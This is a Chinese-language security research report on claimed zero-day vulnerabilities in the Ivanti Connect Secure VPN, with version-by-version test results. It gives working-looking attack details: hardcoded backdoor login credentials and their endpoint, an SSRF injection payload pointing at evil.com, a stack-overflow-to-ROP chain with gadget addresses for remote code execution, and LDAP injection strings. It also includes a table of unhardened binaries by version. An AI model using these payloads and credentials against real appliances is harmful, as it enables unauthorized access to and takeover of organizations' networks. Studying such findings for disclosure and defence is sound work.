# Ivanti Connect Secure 零日漏洞研究报告

## 已确认的零日候选漏洞

### ZD-0: 硬编码后门凭据 (预认证, 已动态验证!)
- **端点**: `/dana-na/auth/url_default/login.cgi` (GET)
- **凭据**: `username=neoteriswatchdogprocess` / `password=danastreet`
- **代码位置**: login.cgi 第 306-312 行
- **行为**: 返回 HTTP 200 OK (空页面), 跳过所有认证逻辑
- **正常失败**: HTTP 501/302 (非 200)
- **影响**: 服务探测/指纹识别, 绕过登录失败日志/锁定
- **版本**: 所有版本 (从 Neoteris 时代遗留)
- **动态验证**: 在 22.7R2.8 靶场已确认
- **SAML 配置发现**: `want-assertion-signed` 默认为 `false` — 不要求签名!

### ZD-1: oauth-consumer.cgi SSRF (预认证, 代码确认)
- **端点**: `/dana-na/auth/oauth-consumer.cgi` (200 OK, 无需认证)
- **根因**: `state` 参数直接拼接到内部 curl URL
- **代码**: `$url = 'http://localhost:7300/...?state=' . $state; curl->setopt(CURLOPT_URL, $url)`
- **利用**: 参数注入 `state=x%26targetURL=http://evil.com`
- **影响**: SSRF → 内部服务访问 → 潜在认证绕过/凭据窃取
- **条件**: OAuth/OIDC SSO 配置（企业部署常见）
- **状态**: 代码审计确认 + 动态验证内部请求发送

### ZD-2: ObjectTag::rewrite sprintf 栈溢出
- **位置**: `libdslibs.so` → `ObjectTag::rewrite()` (10938 bytes)
- **根因**: `sprintf(stack_buf, "<param name='neoteris-doc-base' value='%s' />", URL)`
- **目标**: saml-server (22.8R2.2) — **无 Canary, 无 PIE** (base 0x08048000)
- **利用**: 恶意网页 `<object>` 标签 → VPN Web代理重写 → sprintf 栈溢出 → ROP → RCE
- **ROP**: `execv@0x080b6700` + `"/bin/sh"@0x081c5701`
- **条件**: 认证用户通过 Web 代理访问恶意页面
- **PoC**: [poc_objecttag_overflow.py](poc_objecttag_overflow.py)

### ZD-3: saml-server 无安全保护 + 默认不验签
- **二进制**: 2.1MB, **无 Stack Canary**, **无 PIE**, Partial RELRO
- **SAML 配置**: `want-assertion-signed: false` (默认!)
- **攻击面**: 未签名 SAML assertion → 属性处理 → sprintf/strcpy
- **条件**: SAML SSO 配置（使用默认设置即可）

### ZD-4: LDAP 注入认证逻辑异常
- **端点**: `/dana-na/auth/url_default/login.cgi`
- **现象**: LDAP 注入使认证逻辑走不同路径 (无 p=failed)
- **Payload**: `username=admin)(&)`, `username=admin)(|(password=*))`

## 动态测试覆盖

| 测试 | 结果 |
|------|------|
| **硬编码后门 watchdog** | **已确认 (HTTP 200 vs 501)** |
| **OAuth SSRF** | **已确认 (内部请求发送)** |
| **LDAP 注入** | **异常行为已确认** |
| **SAML 不验签** | **配置已确认 (want-assertion-signed=false)** |
| 路径遍历 (CVE-2023-46805) | 已修复 |
| XFF 溢出 (CVE-2025-22457) | 已修复 |
| 命令注入 (CVE-2024-21887) | 已修复 |
| HTTP 请求走私 | 已防护 |
| SAML XXE | 未发现 |
| JWT alg:none | 未生效 |
| Cookie 伪造 | 已防护 |
| Multipart 解析器 | 500但不崩溃 |

## 二进制安全评估

| 版本 | 二进制 | Canary | PIE | RELRO |
|------|--------|--------|-----|-------|
| 22.7R2.3 | web | **NO** | Yes | Partial |
| 22.7R2.8 | web | Yes | Yes | Full |
| 22.8R2.2 | nginx | Yes | Yes | Full |
| 22.8R2.2 | **saml-server** | **NO** | **NO** | Partial |
| 22.8R2.2 | **browse-server** | **NO** | **NO** | Partial |
